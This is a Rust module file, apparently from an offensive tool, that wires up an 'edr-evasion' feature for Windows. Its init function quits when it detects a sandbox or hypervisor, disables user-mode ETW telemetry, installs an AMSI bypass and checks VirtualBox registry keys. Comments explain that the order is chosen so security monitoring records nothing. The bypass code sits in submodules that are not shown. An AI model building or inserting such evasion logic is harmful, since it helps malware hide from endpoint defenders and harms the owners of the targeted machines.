//! Evasion layer for Windows endpoints running commercial EDR.
//!
//! Feature flag: `edr-evasion` (disabled by default).
//! Enable via: cargo build --features edr-evasion
//!
//! Init order matters:
//!   1. sandbox CPU checks — pure asm, zero Win32 calls
//!   2. etw::bypass()     — kill user-mode ETW before any calls generate events
//!   3. amsi::bypass()    — VEH registration invisible now that ETW is dead
//!   4. sandbox registry  — file I/O telemetry suppressed by dead ETW

#[cfg(feature = "edr-evasion")]
pub mod peb;

#[cfg(all(target_os = "windows", feature = "edr-evasion"))]
pub mod etw;

#[cfg(all(target_os = "windows", feature = "edr-evasion"))]
pub mod amsi;

#[cfg(all(target_os = "windows", feature = "edr-evasion"))]
pub mod sandbox;

/// Initialize all evasion techniques. Call once at process startup before
/// any network or filesystem activity.
///
/// No-op on non-Windows targets or when the `edr-evasion` feature is disabled.
pub fn init() {
    #[cfg(all(target_os = "windows", feature = "edr-evasion"))]
    unsafe {
        // Step 1: CPU-only sandbox checks (pure asm, zero Windows API surface).
        if sandbox::is_hypervisor_cpuid() || sandbox::is_timing_anomalous() {
            std::process::exit(0);
        }

        // Step 2: Kill user-mode ETW. After this, NtTraceEvent is a no-op.
        etw::bypass();

        // Step 3: Install AMSI bypass. AddVectoredExceptionHandler is now invisible to ETW.
        amsi::bypass();

        // Step 4: Registry-based sandbox check (generates file I/O; ETW now dead).
        if sandbox::is_virtualbox_registry() {
            std::process::exit(0);
        }
    }
}
